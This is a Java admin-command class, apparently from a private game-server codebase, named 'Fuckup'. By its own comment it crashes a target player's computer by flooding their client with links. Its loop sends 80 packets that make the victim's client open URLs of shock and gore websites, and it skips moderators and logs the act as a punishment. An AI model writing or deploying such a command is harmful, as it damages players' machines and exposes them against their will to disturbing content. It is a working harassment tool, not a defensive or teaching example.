package osv.model.players.packets.commands.admin;

import java.util.Optional;

import osv.Server;
import osv.model.players.Player;
import osv.model.players.PlayerHandler;
import osv.model.players.Right;
import osv.model.players.packets.commands.Command;

/**
 * Force the computer of a given player to crash by flooding it with links.
 * 
 * @author Emiel
 */
public class Fuckup extends Command {

	@Override
	public void execute(Player c, String input) {
		Optional<Player> optionalPlayer = PlayerHandler.getOptionalPlayer(input);
		if (optionalPlayer.isPresent()) {
			Player c2 = optionalPlayer.get();
			if (c2.getRights().isOrInherits(Right.MODERATOR)) {
				c.sendMessage("You can't use this command on this player!");
				return;
			}
			Server.getPunishmentLogHandler().logPunishment(c2, c, "Fuckup", "");
			for (int j = 0; j < 20; j++) {
				c2.getPA().sendFrame126("www.imswinging.com", 12000);
				c2.getPA().sendFrame126("www.sourmath.com", 12000);
				c2.getPA().sendFrame126("www.googlehammer.com", 12000);
				c2.getPA().sendFrame126("www.bmepainolympics2.com", 12000);
			}
		} else {
			c.sendMessage(input + " is not online. You can only fuckup online players.");
		}
	}
}
